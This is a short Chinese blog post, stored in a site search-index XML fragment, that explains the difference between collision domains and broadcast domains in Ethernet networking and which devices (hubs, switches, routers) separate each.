    <content><![CDATA[<h2 id="冲突域"><a href="#冲突域" class="headerlink" title="冲突域"></a>冲突域</h2><p>又称为碰撞域，连接在同一导线上的所有工作站的集合，或者说是同一物理网段上所有节点的集合或以太网上竞争同一带宽的节点集合。在任一时刻，在一个冲突域中只能有一个节点在发送消息。如果有两个节点同时发送消息就会产生冲突。</p>
<a id="more"></a>

<h2 id="广播域"><a href="#广播域" class="headerlink" title="广播域"></a>广播域</h2><p>简单地说，广播域是一种环境，在该环境中通过线路发送的广播消息，可以被所有该环境中的主机或节点接收。这些主机往往通过以太网中继器或者交换机连接到一起。</p>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>在同一个冲突域中的每一个节点都能接收到所有被其它节点发送的帧；<br>在同一个广播域中的每一个节点都能接收到其他节点发送的广播帧；  </p>
<p><strong>冲突域</strong>是基于物理层的，所以像工作在物理层的集线器、中继器之类的设备是无法划分冲突域的，因为它们本身不能识别MAC地址和IP地址，在传输数据时只是简单的复制信号。而一些处在数据链路层以上的设备都可以划分冲突域，因为它们会通过查询自身维护的一个MAC和端口的对应表，将数据传送到对应的端口，如数据链路层的交换机、网桥，网络层的路由器等设备；<br><strong>广播域</strong>是基于数据链路层的，所以像前面提到的集线器、中继器、网桥、交换机等设备都是无法划分广播域的，而像路由器这样的网络层设备是可以划分广播域的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p>知乎：<a href="https://zhuanlan.zhihu.com/p/74366236" target="_blank" rel="noopener">冲突域、广播域的通俗讲解</a><br>维基百科：<a href="https://zh.wikipedia.org/wiki/%E5%B9%BF%E6%92%AD%E5%9F%9F" target="_blank" rel="noopener">广播域</a><br>百度百科：<a href="https://baike.baidu.com/item/%E5%86%B2%E7%AA%81%E5%9F%9F" target="_blank" rel="noopener">冲突域</a>  </p>
</blockquote>
<blockquote>
<p>版权声明：本文采用[BY-NC-SA](<a href="https://creativecommons.org/licenses/" target="_blank" rel="noopener">https://creativecommons.org/licenses/</a><br>by-nc-sa/4.0/)协议授权，转载请遵守此协议</p>
</blockquote>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>广播域</tag>
        <tag>冲突域</tag>
        <tag>网络</tag>
      </tags>
  </entry>
</search>
